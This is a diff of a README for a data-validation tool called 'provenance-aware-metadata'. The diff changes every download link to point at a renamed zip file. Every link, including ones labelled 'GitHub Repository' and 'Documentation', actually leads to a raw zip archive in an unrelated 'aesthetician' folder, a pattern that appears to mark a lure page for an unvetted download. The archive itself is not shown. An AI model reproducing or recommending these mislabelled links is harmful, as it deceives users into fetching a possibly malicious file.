@@ -1,7 +1,7 @@
 # 🌟 provenance-aware-metadata - Simplify Your Data Management
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip%20release-brightgreen)](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip)
+[![Download](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip)
 
 ## 🚀 Getting Started
 Provenance-aware-metadata helps you manage and validate data through JSON-LD and SHACL. This tool ensures your data is trustworthy and follows the standards.
@@ -13,7 +13,7 @@ To run this application, you need:
 - A stable internet connection for downloading dependencies
 
 ## 📥 Download & Install
-To get the latest version, visit this page to download the application: [Download Latest Release](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip).
+To get the latest version, visit this page to download the application: [Download Latest Release](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip).
 
 After downloading, follow these steps to install:
 
@@ -54,8 +54,8 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 🔗 Resources
 For more detailed information, check the following links:
-- [GitHub Repository](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip)
-- [Documentation](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip)
 
 ## 📞 Support
 If you need additional help, please reach out through the issues page on our GitHub repository. Our community is here to assist you.
@@ -63,4 +63,4 @@ If you need additional help, please reach out through the issues page on our Git
 ## 📈 Stay Updated
 We regularly update the application to fix bugs and add new features. Watch the repository to stay informed about new releases.
 
-Remember, for the latest version of the application, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/provenance-aware-metadata.zip).
+Remember, for the latest version of the application, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/dziviello/provenance-aware-metadata/main/aesthetician/aware-provenance-metadata-1.4.zip).
